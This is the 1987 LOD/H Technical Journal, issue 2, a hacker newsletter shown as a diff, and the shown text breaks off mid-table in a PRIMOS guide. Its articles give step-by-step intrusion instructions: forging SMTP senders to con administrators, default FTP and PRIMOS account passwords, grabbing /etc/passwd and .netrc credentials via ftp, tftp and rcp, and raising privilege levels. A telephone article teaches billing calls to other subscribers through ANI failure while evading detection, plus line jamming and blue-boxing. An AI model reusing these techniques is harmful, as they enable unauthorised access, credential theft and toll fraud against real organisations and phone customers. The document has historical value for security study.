@@ -1,0 +1,3779 @@
+                                    THE
+
+                           LOD/H TECHNICAL JOURNAL
+                           -----------------------
+
+
+                               INTRODUCTION:
+
+
+
+     This is issue #2, we had originally planned to put out 6 issues a year,
+but it looks as if this will become a quarterly newsletter instead. This is due
+to the fact that the articles take months to fully research, write, and edit.
+By year end, we hope to show that we are not a "fly-by-night" newsletter and
+will continue to provide you with the same level of information, accuracy, and
+originality as this issue and the first. We appreciate those who have been
+downloading, storing, and distributing the newsletter in its entirety, and hope
+this will continue, as it benefits everyone.
+
+
+     Here is the breakdown of this issue: 1 article on Telecommunications,
+4 articles on Datacommunications, and one article in the 'other' category. Two
+authors have written articles for Issue 1, and 5 are new. Obviously this Issue
+is more hacking related, whereas Issue 1 was more phreaking related. If you
+have any material which may be of interest, let us know.
+
+
+     Our 'sponsor' BBS list has been shortened to one dependable board, as
+Metal Shop Private, Shadowspawn, Hell Prozen Over, The Private Sector and
+Atlantis have all gone down, though some may be back online in the future. Left
+is Digital Logic. The usernumber/usernames for DL follows for those who wish to
+get in contact with us. We are open to suggestions for more Sponsor Boards.
+
+Digital Logic: 305-395-6906 New User Pass=DIGIT
+LOD/H Technical Journal Staff Account Number is 231.
+
+One last note, a slight clarification on articles. Articles labeled with
+letters, ie: Part A & Part B as in last issue's articles on the Outside Loop
+Distribution Plant by Phucked Agent 04 and the LOH Telenet Directory along with
+this issue's article on Hacking CMS by Lex Luthor are intended to be complete
+articles in themselves and should be merged together. They were broken up for
+editing and transmission purposes. Articles labeled as Part 1 & Part 2, are
+separate articles based on the same subject.
+
+-------------------------------------------------------------------------------
+
+                  TABLE OF CONTENTS:
+
+01 Introduction to the LOD/H Technical Journal          Staff             04 K
+   and Table Of Contents for Volume 1, Issue 2
+02 The Networked Unix                                   Solid State       17 K
+
+03 Step By Step (SXS) Switching System Notes            Phantom Phreaker  12 K
+
+04 A Guide to the PRIMOS Operating System               Carrier Culprit   25 K
+
+05 Identifying and Defeating Physical Security and      Lex Luthor        30 K
+   Intrusion Detection Systems Part II: The Exterior
+
+06 A Discrete Unix Password Hacker                      Shooting Shark    09 K
+
+07 Hacking DEC's TOPS-20:  Part II                      Blue Archer       25 K
+
+08 Hacking IBM's VM/CMS Operating System, Part A.       Lex Luthor        26 K
+
+09 Hacking IBM's VM/CMS Operating System, Part B.       Lex Luthor        25 K
+
+10 Network News & Notes                                 Staff             07 K
+
+Total: 7 articles, 10 files  180 K
+
+-------------------------------------------------------------------------------
+The LOD/H Technical Journal: File #2 of 10
+
+
+----------------------------
+     The Networked UNIX
+          :TCP-IP
+  by:
+        SOLID STATE
+        June 23 1987
+----------------------------
+
+PREFACE
+
+   I've written this article with the assumption that those reading it have a
+working knowledge of UNIX and large networks, specifically the DARPA Internet
+-- ARPAnet and MILnet. Within I offer guidance on features of the TCP-IP
+(Internet Transmission Control Protocol) architecture, such as FTP, TFTP,
+TELNET, SMTP, and the UNIX Remote Execution Facilities. Before I commence, I
+want to make it known that this file is not intended to be a 'why' file, but
+instead a 'how to' tutorial. In the event I get a good response concerning
+this document, I may later release a more technical oriented paper from a
+programmer's viewpoint.
+
+   NOTE: Instances where I give examples of a command format, words in capital
+represent variables. For example, in the line '$ telnet HOST', HOST should be
+replaced (in LOWERCASE!) by the name of a system. This is just my means of
+distinguishing between actual commands and their options.
+   Control characters are denoted in the form of an exponent, eg. ^H is
+control H.
+
+YP DATABASE
+
+   Present on every UNIX that supports TCP-IP are a set of files labeled by
+programmers as the yellow pages, that serve as a directory of the hosts and
+networks accessible by your system. These files are /etc/hosts and
+/etc/networks respectively. There may also be a third, /etc/hosts.equiv which
+is a listing of those hosts that share resources and/or have users common to
+each other. They are ASCII text and have viewable permissions to all.
+Therefore it may prove helpful to print these out for reference and easy
+access. Entries in the above mentioned take the form:
+
+###.###.###.###     host.owner.research   nicknames
+
+Example:
+
+18.72.0.39          athena.mit.edu   mit-athena athena
+
+   The string of numbers, expressed in octal "dot notation", is the NetNumber
+of the host. Followed by the complete name, and lastly other names which it is
+universally known as. When attempting to access a system, any one of these
+identification codes may be used.
+   NOTE: Most of the databases one will come across are incomplete or may be
+outdated. A complete host list can be obtained from the Network Information
+Control Center (NIC) at SRI International, the host name is sri-nic.arpa
+
+TELNET
+
+   Telnet is the standard facility used for logging into other systems. It is
+found not only on UNIX, but TOPS, VMS, and all the other various operating
+systems found on the DDN. To activate the program:
+
+% telnet HOST [PORT]
+
+   If invoked without arguments, it enters command mode, indicated by the
+prompt 'telnet>' From here, many functions are available.
+
+open HOST [PORT]
+   Open connection to named computer. If PORT, which shall be explained
+subsequently, is ommitted then telnet will contact the TELNET server of that
+host. As earlier mentioned, systems can be addressed by either their
+NetNumber, NetName, or a nickname.
+
+close
+   Close connection and return to command mode.
+
+quit
+   End session and exit program.
+
+status
+   Show current status of telnet. ie. connections and toggled options.
+
+z
+   Suspend telnet. This allows you to operate an interactive shell on the
+local machine while pending an open connection to a remote host.
+
+? COMMAND
+   Get help on COMMAND. Or if COMMAND is ommitted, then a summary of all
+options is printed.
+
+   Once a connection has been established, telnet enters input mode where you
+can communicate directly with the remote. To return to command mode, enter ^]
+A hacking session might look like:
+
+% telnet ucbvax.berkeley.edu
+Trying 10.2.0.78 ...
+Connected to ucbvax.berkeley.edu.
+Escape character is '^]'.
+
+4.3 BSD UNIX (ucbvax.Berkeley.EDU)
+
+login: example
+Password: ^D
+Connection closed by foreign host.
+%
+
+PORTS
+
+   Each host on the Internet runs various daemons to perform tedious upkeep
+jobs like recording logs, mounting disks and on UNIX, cleaning uucp and /tmp
+files. Along with the 'normal' daemons is one ran to accomodate communication
+between a host and its peers on a network. inetd the managing daemon of system
+to system communication has a number of various services which it regularly
+uses, but they can also be manually addressed via telnet. The notation,
+predisplayed, is simply:
+
+% telnet HOST PORT
+
+OR
+
+telnet> open HOST PORT
+
+   Now each service has a port number associated with it. The number is
+decimal, in the range 0-1023. A database of all active services is located in
+the ASCII text file /etc/services
+   From a hacker's view the following are very helpful in the process of
+penetrating a system:
+
+79        Finger server. Connecting to this will give a systat report similar
+to one a user would get if he was on the target system and issued the finger
+command. Once connected to port 79, the host will sit idle until one of two
+things: Either a return is pressed and a general finger will result, or a
+username is entered where personal info will outcome.
+
+% telnet psuvax1.psu.edu 79
+Trying 128.118.6.2 ...
+Connected to psuvax1.psu.edu.
+Escape character is '^]'.
+
+Login       Name              TTY Idle    When            Office
+opr      The Operator          co      Sat 19:02  334  Whitmo  x5-9723
+hager    William W. Hager      d1      Sat 18:50              237-8876
+georg    Georg Schnitger       22 1:32 Sat 18:42  315  Whitmo  x5-1406
+malik    Sohail Malik          p0  18  Sat 19:16  214c  Compu  x5-0816
+Connection closed by foreign host.
+%
+
+11        Systat server. This can not be issued to target UNIX systems, but is
+applicable to VMS and TOPS where it returns data like that from finger.
+
+25        SMTP server. This is the server used for mail among systems. It is
+also the most vulnerable port to attack as it can be easily fooled. With this
+knowledge the hacker can assume any identity he wishes through mail. For
+example, to send mail to guest@cc3.bbn.com from root@satnet.arpa, under normal
+circumstances one would have to possess the root account wherefrom he would
+just enter:
+
+% mail guest@cc3.bbn.com
+
+   But this is not always feasible or possible! So we must resort to an
+indirect, devious approach..
+
+% telnet cc3.bbn.com 25
+Trying 8.3.0.5 ...
+Connected to cc3.bbn.com.
+Escape character is '^]'.
+
+220 cc3.bbn.com. Sendmail 3.2/SMI-3.2 ready at Fri, 28 Feb 87 17:40:53 PST
+
+rcpt to: guest
+250 guest... Recipient ok
+mail from: root@satnet.arpa
+250 example... Sender ok
+data
+354 Enter mail, end with "." on a line by itself
+
+This is an example of the SMTP port.
+.
+250 Mail accepted
+^]
+telnet> c
+Connection closed.
+%
+
+   To summarize the text above; First, contact the remote at port 25 using
+telnet:
+
+% telnet HOST 25
+
+   After system link authentication, enter:
+
+rcpt to: USERNAME
+
+   Ok? Type in bogus identity:
+
+mail from: USERNAME@HOST
+
+   To start message:
+
+data
+
+   Now, the mail:
+
+     My organization has of late been discussing an upgrade to a Vax
+processor. The Sun computer we are currently using is immensely slow (and
+getting slower!) due to the demands put on it by the users. If you would allow
+me a demo account on your system so I may view its performance, I would be
+deeply grateful.
+     Please respond to me through mail at: bogus!haha!sys1!jeff.
+
+   A period on a line by itself will complete the transfer:
+
+.
+
+FTP
+
+   FTP is a file transfer program that is quite powerful and helpful to the
+hacker in obtaining access to a target. It can be used to send and receive
+data. Similar to telnet, the client with which to communicate can be
+specified when invoked:
+
+% ftp -n HOST
+
+   The -n option I always include as it disables auto-login and net-trace, an
+auto-feature which sends the originator's login and system name. The prompt
+for FTP is 'ftp>'.
+
+open HOST
+   Establish connection to the named HOST.
+
+close
+   Terminate connection and return to command interpreter.
+
+quit
+   Abort program.
+
+status
+   Show status parameters.
+
+! COMMAND
+   Run shell command on local machine. Like the 'z' option of telnet, if
+COMMAND is ommitted, than an interactive shell is invoked. ^D will return user
+back to the interpreter.
+
+ls
+   Print a listing of the directory contents on the remote host in an
+abbreviated form. To do a long listing, enter 'dir'.
+
+cd REMOTE_DIRECTORY
+   Change the working directory on server.
+
+pwd
+   Print working directory on remote.
+
+lcd DIRECTORY
+   Change the working directory on the local machine to DIRECTORY.
+
+get REMOTE_FILE LOCAL_FILE
+   Receive the REMOTE_FILE on the remote system and name it LOCAL_FILE on the
+local system.
+
+send LOCAL_FILE REMOTE_FILE
+   Send LOCAL_FILE to the host and name it REMOTE_FILE.
+
+append LOCAL_FILE REMOTE_FILE
+   Append LOCAL_FILE to the end of the distant file, REMOTE_FILE.
+
+rename REMOTE_FILE NEW_REMOTE_FILE
+   Give a new name to a remote file.
+
+delete REMOTE_FILE
+   Kill REMOTE_FILE.
+
+   Various other commands exist for bulk transfers and directory management.
+If there is any doubt ever on a command, help is always available:
+
+ftp> help COMMAND
+
+   Once a connection has been made, the computer will identify itself and then
+go idle. (That is, if auto-logging is disabled as it should be.) To login to
+the system:
+
+ftp> user USERNAME
+
+   Then if a pass is required, the proper prompt will appear.
+
+% ftp -n
+ftp> o ll-xn.arpa
+Connected to LL-XN.ARPA.
+220 ll-xn FTP server (Version 4.103 Wed Jun 25 17:42:33 EDT 1986) ready.
+ftp> user anonymous
+331 Guest login ok, send ident as password.
+Password:
+230 Guest login ok, access restrictions apply.
+ftp>
+
+   Logging on to a FTP server is different than normally entering a machine.
+When a remote user is operating FTP, the exchange is treated as a process of
+ftp or daemon, not an actual login. Therefore, a different login program,
+which restricts use immensely, is used.
+   If set up properly, FTP will chroot to /usr/spool/ftp where three
+directories exist, bin, etc, and pub. Within /usr/spool/ftp/etc is the
+password file used for the FTP server login program. It is not a complete
+version of that in /etc/passwd, but it can be useful by providing usenames.
+   Also of mentioning is /etc/ftpusers. This file contains multiple lines
+of usernames is like /usr/lib/cron/cron.deny on a Unix System V. If you are
+unlucky and your username appears in the file, FTP logins are denied.
+   A few defaults are present within this doctored version of /etc/passwd that
+most always will provide access to a system.
+
+ACCOUNT                  PASSWORD
+=================================
+anonymous                anonymous, guest, ftp
+ftp                      ftp
+guest                    guest
+ftpser                   ftpser
+tftpser                  tftpser
+help                     help
+
+   Each user may have in their home directory a file titled '.netrc'. This is
+a file containing usernames and passwords used on systems that a user commonly
+converses with. Entries in the file take the form:
+
+machine HOST login USERNAME password PASSWORD
+
+   It is advantageous to locate all of these files on your system as they will
+expand not only your systems list, but also your chance of entering a
+computer.
+   Once admittance has been gained, I suggest copying the /etc/passwd file for
+later attempts at hacking the front end of the system if other routes such as
+defaults, finger, TFTP (To be explained hereafter.), or by way of the remote
+facilities (Ditto.) are not possible.
+
+ftp> get /etc/passwd pass
+200 PORT command okay.
+150 Opening data connection for /etc/passwd (26.8.0.14,1389) (47 bytes).
+226 Transfer complete.
+48 bytes received in 0.32 seconds (0.15 Kbytes/s)
+ftp> close
+221 Goodbye.
+ftp> quit
+%
+
+
+TFTP
+
+   The Trivial File Transfer Program is probably the most dangerous aspect of
+the TCP-IP structure on the Internet. TFTP requires no account or password be
+present on a host system. About the only restriction is that the files
+inquired must have public read access permissions set. If not, an
+authorization failure error will result. Also, the TFTP server port must be
+open, otherwise no transmissions can take place.
+
+% tftp HOST
+
+   Once connected, the user will get the 'tftp>' prompt where from he can grab
+or send files.
+
+connect HOST
+   Set HOST up for transfers. There is no actual connection made in the sense
+that communication has happened, the program merely remembers what host to be
+used in a transfer inquiry. Therefore, there is not a disconnect command.
+
+quit
+   Exit TFTP.
+
+status
+   Show current set parameters. ie. HOST and timeout period.
+
+get /PATH/FILE /PATH/FILE
+   Get /PATH/FILE from HOST and name it /PATH/FILE on local system. If no HOST
+has been specified yet, the form may be 'get HOST:/PATH/FILE /PATH/FILE'.
+
+put /PATH/FILE /PATH/FILE
+   Send /PATH/FILE on local system to HOST and give it the title /PATH/FILE.
+As above, if HOST has not been specified, the form is 'put /PATH/FILE
+HOST:/PATH/FILE'.
+
+timeout SECONDS
+   Set timeout parameter. The default is 25, that means abort transmission if
+no response from selected host after set period.
+
+? COMMAND
+   Help with TFTP.
+
+   TFTP is the preferred method of file transfer. But is often closed to use
+due to its insecurities. To the hacker though, it is wonderful because data
+captured are genuine, not doctored versions as is the case with FTP. Therefore
+if possible, one will most likely use it to copy /etc/passwd:
+
+% tftp mit-amt
+tftp> get /etc/passwd /tmp/passwd
+Received 16453 bytes in 7 seconds.
+tftp> q
+%
+
+REMOTE PROCEDURES
+
+   Additional to the standard features of the TCP setup present on all
+machines of the net, UNIX has a set of it's own remote system interaction
+commands. The set of utilities, which I affectionately call the Remote
+Execution Facilities, are usable only between resource sharing UNIX systems.
+The conglomeration of remote programs can be very helpful for overtaking other
+suspect targets, especially if they are part of a small network unto
+themselves besides being major hosts on the Internet.
+   Before one sets out on the quest of conquering a system, it is wise to know
+who is currently logged on:
+
+% rusers -l HOST
+
+   Rusers -l alone will print out a listing for all immediate surrounding UNIX
+hosts, but if a HOST is specified, only that particular computer will report.
+
+% rlogin HOST -l USERNAME
+
+   If -l USERNAME is not included, the account name in use at present time
+will be used as the USERNAME when attempting login to HOST. If the username
+specified is present locally and on the distant machine in the file
+/etc/hosts.equiv, no password is required to login. This can be compromising
+to the security, a reason why the security wise will often make
+/etc/hosts.equiv a null file.
+   Each user may optionally have a file, '.rhost', in his home directory. This
+is a personal equivalent to /etc/hosts.equiv. If you are logged into an
+account with such a file, no pass is required to login (via rlogin), to the
+computers named.
+   Alike to the UUCP protocol, there is an allowance of the Remote Execution
+Facilities to preform commands on a networked system:
+
+% rsh HOST -l USERNAME "COMMAND"
+
+   Remote shell will permit unlimited commands to be carried out on the remote
+as long as the following criteria is met:
+     The username, if specified (If it is not, the current local one is
+used.), must be present on the foreign system and have remote execution
+privileges.
+     Commands are effective according to the environment set in .cshrc and
+.login on the host.
+   An example job:
+
+% rsh century "ps -t console"
+
+   If the quotes are ommitted then variables like *?.,\ are taken literally.
+Also, if no redirection is submitted, than output, if the command yields it,
+is sent back to the issuee.
+   Remote Copy, a sub-command of rsh, is a command similar to uucp. It must
+follow the criteria of Remote Shell plus all files qued must have public read
+permissions.
+
+% rcp HOST:/PATH/FILE HOST:/PATH/FILE
+
+   For example, a common call would be the password file. So if I wanted to
+transfer the /etc/passwd file from harvard.arpa to rutgers:
+
+% rcp harvard.arpa:/etc/passwd rutgers:/tmp/passwd
+
+   This format leaves quite alot of flexibility as it stands third party
+transfers are possible. If the second HOST is not inserted, than the file is
+put on the local system.
+   A notable option of rcp is directory copy. It will if specified, copy a
+directory and all the trees beneath it...allowing you to in theory to copy the
+entire file system onto your local host. (uh, oh!)
+
+% rcp -d HOST:/PATH/DIRECTORY_NAME HOST:/PATH/DIRECTORY_NAME
+
+CONCLUSION
+
+   In closing I would like to state that I have purposely left much
+information uncovered if I felt it would compromise an institution or company.
+I apoligize for not explaining many of the subjects discussed in the full
+detail they deserve, but if I had this article would have been mammoth.
+   Any questions, challenges, comments, or criticism can be directed to me,
+Solid State, through any of a various boards I visit or to an LOD/H Technical
+Journal account of which your mail shall be somehow communicated to me.
+Sys Unix Comm
+                         STEP BY STEP SWITCHING NOTES
+
+                              BY PHANTOM PHREAKER
+
+                      WRITTEN FOR LOD/H TECHNICAL JOURNAL
+
+
+    The following research was done on a class 5 Step By Step switching system.
+Items mentioned in this article are not guaranteed to work with your particular
+office.  The following interesting topics about Step By Step switching are for
+informational and educational purposes only. This article is aimed at people
+who wish to learn more about telephone switching systems.
+
+    I realize step-by-step switching is dwindling every day, with many
+electromechanical SxS offices being replaced with newer electronic/digital
+switches and Remote Switching Systems (RSS's). However, rural areas of the U.S.
+still use Step, so if you are ever in an area served by a SxS CO you may be
+able to use this information.
+
+
+    1:ANI Failure/ONI
+    To understand this technique, you must understand how ANI functions in the
+Step-by-Step switching system. Your CO sends ANI, with your number, in MF or DP
+to receivers that collect the ANI information and store it, along with the
+called number, on the appropriate form of AMA tape. ANI outpulsing in MF can
+use either LAMA (Local Automatic Message Accounting) or CAMA (Centralized
+Automatic Message Accounting). ANI sent in DP type signalling can also be used,
+but is rare. DP vs MF trunk signalling is similar to the difference between
+DTMF and pulse dialing, except on a trunk. DP signalling sends all information
+in short bursts of 2600Hz tones.
+
+    Causing ANIF's/ONI is an easy task in SxS (and some versions of Xbar),
+because the customer's link to the CO will allow the customer to input MF tones
+to influence a calls completion. This can be done by dialing a long distance
+number and listening to the clicks that follow. After the first click when you
+are done dialing, you will hear a few more. They will be timed very close to
+one another, and the last click occurs right before the called telephone rings.
+The number and speed of the clicks probably varies. Basically what these clicks
+are is the Toll Office that serves your CO setting up a route for your call. In
+order to abuse this knowledge, you need access to a MF source, whether it be a
+blue box, a computer with a good sound chip, tape recording, etc. Right before
+you hear the series of clicks, send one of the following sequences in MF:
+
+KP+1 (Repeatedly) For Automatic Number Identification Failure (ANIF)
+
+-or-
+
+KP+2 (Repeatedly) For Operator Number Identification (ONI)
+
+(Note:these will not work if your CO uses DP signalling.)
+
+Play these tones into the phone at a sufficient volume so that they 'drown out'
+the series of clicks. Do not send an ST signal, as you are not actually dialing
+on a trunk. You must send these MF sequences quickly for this method to work
+correctly. After you have played your 'routing' a few times, you will hear a
+TSPS operator intercept your call and ask for the number you are calling FROM.
+When an ANIF is recognized, the call is cut through to a TSPS site that serves
+your area. Now, you can give the operator any number in your exchange and she
+will enter the billing information manually, and put the call through. The toll
+charges will appear on the customer who owns the number you gave. You can also
+accomplish a similar feat by merely flashing the switchook during the series of
+clicks. This will send DC pulses that scramble the ANI outpulsing and cause
+your call to be sent to a TSPS operator before the dialed number. Be sure to
+stop sending the MF 'routing' after the operator attaches or she may know that
+something's up. Use this method sparingly and with caution. It would also be a
+good idea not to use the same number for billing more than one time. Don't use
+this method in excess, because a toll office report will list the number of ANI
+failures for a specific time period. The ONI method works better because it is
+assumed ONI is needed to identify a caller's DN upon a multi-party line. Too
+many ANI failures will generate a report upon a security/maintenance TTY, so if
+you plan on using this method, use the ONI method instead of just ANI Failure.
+The basic idea behind the ANIF is to scramble your ANI information by using MF
+(or the switchhook) to send your LD call to a TSPS operator for Operator Number
+Identification (ONI) due to ANI Failure. The idea behind the ONI method is that
+you are fooling the switch into thinking you are calling from a multi-party
+line and ONI is needed to identify your DN.
+
+
+    2:Test numbers
+
+    Some other interesting things in the Step By Step system can be found by
+dialing test numbers. Test numbers in SxS switching systems are usually hidden
+in the XX99 area, as opposed to 99XX, which is common for other types of
+switching systems. These types of numbers are possibly physical limitations of
+a SxS switch, and thus a milliwatt tone or other test numbers will be placed
+there, because a normal DN can't be assigned such a number. However, these XX99
+numbers are usually listed in COSMOS as test numbers. Another interesting note
+about XX99 numbers is that they seem (at least in some offices) to be on the
+same circuit. (That is, if one person calls an XX99 number and receives a test
+tone, and another person calls any other XX99 number in that same prefix, the
+second caller will receive a busy signal).
+
+    Here we must examine the last four digits of a telephone number in detail.
+
+
+XXXX=WXYZ             W=Thousands digit
+                      X=Hundreds digit
+                      Y=Tens digit
+                      Z=Units digit
+
+
+    Dialing your prefix followed by an XX99 may result in a busy signal test
+number, a network overflow (reorder), milliwatt tones, or other type of error
+messages encountered when dialing.
+
+    Not every XX99 number is a test number, but many are. Try looking for these
+in a known Step by Step office.
+
+    The numbers that return a busy signal are the ones that incoming callers
+are connected to when the Sleeve lead of the called Directory Number is in a
+voltage present state, which means the line is in use or off-hook. More about
+this in the next topic.
+
+
+    3:Busy signal conferencing
+
+    Another interesting feature of the Step-By-Step system is the way busy
+tones (60 IPM) are generated. In ESS and DMS central offices, busy signals that
+are sent by the terminating switch are computer generated and sound very even
+and clear with no signal irregularity. In SxS, all calls to a particular DN are
+sent to the same busy signal termination number, which can be reached most of
+the time by a POTS number. These busy tones are not computer generated and the
+voice path is not cut-off.
+
+    You can take advantage of this and possibly have a 'busy signal conference'.
+This can be achieved by having several people dial the same busy DN that is
+served by a Step office, or by dialing an always-busy termination number. When
+you are connected to the busy signal, you will also be able to hear anyone else
+who has dialed the same busy number. Connection quality is very poor however,
+so this is not a good way to communicate.
+    As an added bonus, answering supervision is not returned on busy numbers,
+and thus the call will be toll-free for all parties involved. However, you must
+be using AT&T as your inter-LATA carrier if the call to the busy number is an
+inter-LATA call for you. So if your IC is US Sprint, you must first dial the
+AT&T Carrier Access Code (10ATT) before the busy number. If your IC doesn't
+detect answer supervision, and begins billing immediately or after a certain
+amount of time, then you will be billed for the length of the call.
+
+
+    4:Temporarily 'freezing' a line
+
+    A SxS switching system that operates on the direct control principle is
+controlled directly by what the subscriber dials. Jamming a line on SxS to
+prevent service is possible by simply flashing the switchook a number of times.
+Or you may find after several aborted dialing attempts, the line will freeze
+until it is reset, either manually or by some time-out mechanism. Usually the
+time the line is out of action is only a few minutes. The line will return a
+busy signal to all callers, and the subscriber who has a 'dead' phone will not
+even hear sidetone. This happens when one of the elements in the switch train
+gets jammed. The switch train consists of the linefinder, which sends a dial
+tone to the subscriber who lifted his telephone, and places voltage on the S
+(Sleeve) lead as to mark that given DN as busy. Next in the switch train are
+the selectors. The selectors are what receive the digits you dial and move
+accordingly. The last step in the switch train is the connector. The connector
+is what connects calls that are intraoffice, and sends calls to a Toll office
+when necessary. Other types of devices can be used in the switch train, such as
+Digit Absorbing Selectors, where needed.
+
+    5:Toll/Operator assisted dialing
+
+    You may be able to dial 1/0+ numbers with your prefix included in some
+areas. You can dial any call that you could normally reach by dialing 1+ or 0+.
+For example, to dial an operator-assisted call to a number in Chicago, you
+could dial NXX+0312+555+1000 where NXX is your prefix, and you would receive
+the usual TSPS bong tone, and the number you dialed, 312+555+1000, would show
+up on the TSPS consoles LED readout board. You can also use a 1 in place of the
+0 in the above example to put the call through as a normal toll call.
+
+    This method does not bypass any type of billing, so don't get your hopes
+up high.
+
+    The reason this works is twofold. The first reason is that the thousandths
+digit in many SxS offices determines the type of call. A 0 or a 1 in place of
+another number (which would represent a local call) is handled accordingly. The
+other reason is due to a Digit Absorbing Selector that can be installed in some
+SxS offices to 'absorb' the prefix on intraoffice calls when it is not needed
+to process the call. A DAS can absorb either two or three digits, depending
+on whether the CO needs any prefix digit(s) for intraoffice call completion.
+
+    6:Hunting prefixes
+
+    SxS switches may also translate an improperly dialed local call and send
+it to the right area over interoffice trunks. Take for instance, you need to
+make a local call to 492-1000. You could dial 292-1000 and reach the exact
+same number, provided that there is no 292 prefix within your local calling
+area. However, only the first digit of a prefix may be modified or the call
+will not go through correctly unless you happen to have dialed a valid local
+prefix. You also cannot use a 1 or a 0 in place of the first prefix digit,
+because the switch would interpret that as either dialing a toll or an operator
+assisted call.
+
+
+    7:Trunks
+
+    Step by Step switching system incoming and outgoing trunks are very likely
+to use In-band supervisory signalling. This means you could possibly use
+numbers served by a SxS CO to blue box off of. But, some older step areas may
+not use MF signalling, but DP signalling. DP signalling uses short bursts of
+2600Hz to transfer information as opposed to Multi-Frequency tones. In DP
+signalling, there are no KP or ST equivalents. Boxing may be accomplished from
+DP trunks by sending short bursts of 2600Hz (2 bursts would be the digit 2).
+Acceptable pulse rates are 7.5 to 12 pulses per second, but the normal rate is
+10 pulses per second. A pulse consists of an 'on hook' (2600Hz) tone and an
+off-hook (no tone). So, at 10 pulses per second, a digit might be .04 seconds
+of tone and .06 seconds of silence. DP is rarely used today, but some
+direct-control Step offices still use it. Common Control Step offices are much
+more likely to use MF trunk signalling.
+
+
+    As said at the start of this file, some of the things mentioned here may
+have no practical use, but are being exposed to the public and to those who did
+not know about any one of the procedures mentioned here previously.
+
+
+                        References and acknowledgements
+===============================================================================
+     Basic Telephone Switching Systems-By David Talley, Hayden publishers
+               No. 1 AMARC-Bell System Technical Journal
+  Mark Tabas for information about CAMA and DP, The Marauder, and Doom Prophet.
+===============================================================================
+ The LOD/H Technical Journal: File #4 of 10
+
+                     Written by,
+                   Carrier Culprit
+                         and
+                The Legion Of Hackers
+
+  This is Part I of a II part series on the PRIME
+  operating system.  In this article I will give a
+  general overview of the system and command usage.
+
+Note: This article will center around the Primos version 19, and revisions 19.1
+and up.
+[Background Information]
+  Primos is the operating system for the PRIME mainframe, and supermini
+systems.  The operating system is usually run on the Prime 750.  Primos is a
+relatively secure system. Externally security is great, but the internal
+security needs help.  The latest revision of version 19 is 19.4.0 (as of this
+writing). This revision is more secure in both external and internal security
+than its predecessors. By the time this article is released, Version 20 should
+be out and an article on that version will be forthcoming.
+
+
+[Logging in V18.x.x]
+
+  It is quite easy to hack into a Prime running a version 18 of Primos.
+The external security is rather poor.  All you need is an ID to logon.
+There is no password prompt, thus getting an operator's account is
+rather easy. Occasionally, there will be some additional security software
+running and passwords will be needed. I am not going to go into detail on
+version 18 because it is obsolete, any questions regarding version 18 please
+leave me mail.
+
+
+[Logging in V19.x.x]
+
+  A Primos system is very easy to recognize.  Once you are connected,
+hit a few returns to get the "ER!" prompt or you may be prompted
+with the ID prompt.  If you do get prompted with the ID prompt, you need
+not put "Login" in front of the ID. Here is an example of a Primos login:
+
+ATDT 123-4567
+
+[2 RETURNS]
+ER! Login CARRIER
+Password:
+
+ Prime (user 31) Logged in Friday, 5-Sept 14:27:20
+ Welcome to  Primos Version 19.4.5
+ Last login Thursday, Sept 4 1986 02:01:12
+ (1 mail waiting)
+
+ Note: You usually get 1 try to login before being disconnected.
+
+  In some cases the 2 c/r's are not needed and some systems won't respond until
+you type "login" and a return. Passwords and ID's are 6 characters, they may
+consist of letters and numbers.  Finding passwords on a Primos can be hard, but
+there are some common ID's and passwords.  You must use "login" before entering
+your ID.  In this case my ID is "CARRIER".  Here is a common list of ID's and
+passwords I have come across:
+
+  ===============================
+  |  ID name     |  Password    |
+  ===============================
+  |  PRIME       |  PRIME       |
+  | *SYSTEM      |  SYSTEM      |
+  |  PRIMOS      |  PRIMOS      |
+  | *ADMIN       |  ADMIN       |
+  |  RJE         |  RJE         |
+  |  DEMO        |  DEMO        |
+  |  GAMES       |  GAMES       |
+  |  GUEST       |  GUEST       |
+  |  REGIST      |  REGIST      |
+  |  TEST        |  TEST        |
+  |  NETMAN      |  NETMAN      |
+  |  PRIRUN      |  PRIRUN      |
+  |  TOOLS       |  TOOLS       |
+  |  CMDNC0      |  CMDMNC0     |
+  | +TELENET     |  TELENET     |
+  ===============================
+ Note: * means that that ID is most likely to have SYS1 priorities.
+ Note: + account belongs to Telenet or some employees of Telenet in which the
+         Primos will be located on the Telenet packet network.
+
+System Accounts:
+
+SYSTEM- This account usually contains configuration programs.  It
+        also contains system messages, logs, and userlists.
+
+TOOLS-  This account usually contains the utility to add users and the Netlink
+        utility (Explained later).
+
+CMDNC0- Contains help files.
+
+  These are default accounts which are standard in new Primos systems. They
+should be there unless the userfile has been modified by the system operator.
+
+  You can also mix them around, ie- Login SYSTEM  Password:PRIME
+There is no "systat" or extensive on-line help before logging in. Don't you
+wish people would model their operating systems after TOPS-10 (chuckle)?  The
+best account to get on under would be an account with SYS1 priorities. This
+account is for people who advise regular users.  Ok, lets assume you have
+hacked onto a regular account something like games.
+
+  The command prompt for Primos is "OK,".  The first thing we would
+want to do is to see who is logged in. We would type "Users" and
+would get something like this:
+
+ OK, Users
+ Users=8
+
+  This is telling us that there are 8 users currently logged in, which isn't
+extremely helpful. To get a full listing of usernames we would type "Status
+Users" or "Status -Users".  We would get a status of users currently on-line.
+It would show us usernames, devices, and other sub-categories.  Here's a sample
+of what you would get:
+
+User                  Number         Device
+ADMIN                   3            <MDF0>
+SYSTEM                  1            <MFD0> <MFD1>
+OBB                    31            <MFD0>
+CRIMINAL               12            <MFD1>
+
+  If you see that other people are logged in, it may be best to log off and
+call back later, as the operators can perform the same command, and if they
+know that user should not be on the system at that time, you will obviously be
+kicked off.  If there are 2 devices specified, the user is either receiving
+output from a different device, sending input to that device, or has logged out
+incorrectly (tsk tsk).
+
+  To get a full status of memory and accounting, you would type "Status System"
+This is usually in a Menu driven program, and you will get different options.
+ie- Log of users, memory, devices, etc.
+
+  We can access different priority levels by using the "CHAP" command.  This is
+the way we can find out what our priority level is. We would do:
+
+OK, CHAP UP
+
+OK, CHAP DOWN X or CHAP DOWN
+
+ to return to your original priority level:
+
+OK, CHAP ORIGIN or CHAP DEFAULT
+
+  Usually a user may leave his priority level rather low. You can then try to
+raise your level.  There should be 6 different priority levels. A 0 meaning
+lowest, and 6 meaning highest.  Here is a little diagram that will give you a
+list of ID's and what most of them will have access to.
+
+Note: Some may have access to more or less than what I have written, but
+      the comments are accurate for most systems.
+
+       !=================================================!
+       !     ID         !          Comments              !
+       !=================================================!
+       !   GAMES        !Allows user to view low level   !
+       !                !directories, and execute regular!
+       !                !commands. ie-CHAP, STATUS       !
+       !=================================================!
+       !   DEMO         !Allows user to run games, and   !
+       !                !execute the tour program.  Most !
+       !                !commands will not work, and it  !
+       !                !has a time limit. Lastly, it can!
+       !                !only access low lvl directories.!
+       !=================================================!
